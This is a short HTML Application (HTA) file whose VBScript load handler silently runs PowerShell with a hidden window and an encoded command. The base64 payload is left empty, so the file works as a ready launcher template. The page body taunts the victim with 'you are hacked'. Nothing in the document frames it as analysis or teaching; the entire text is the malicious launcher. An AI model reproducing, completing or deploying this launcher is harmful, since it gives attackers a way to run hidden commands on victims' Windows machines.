<html>
<head>
  <title>TA TA</title>
  <hta:application id="app" />
  <script language="VBScript">
    Sub Window_OnLoad()
      Dim base64Command, shell, cmd
      base64Command = ""
      Set shell = CreateObject("WScript.Shell")
      cmd = "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand " & base64Command
      shell.Run cmd, 0, True
    End Sub
  </script>
</head>
<body>
  <h2>you are hacked, I am not joking! LOL</h2>
</body>
</html>
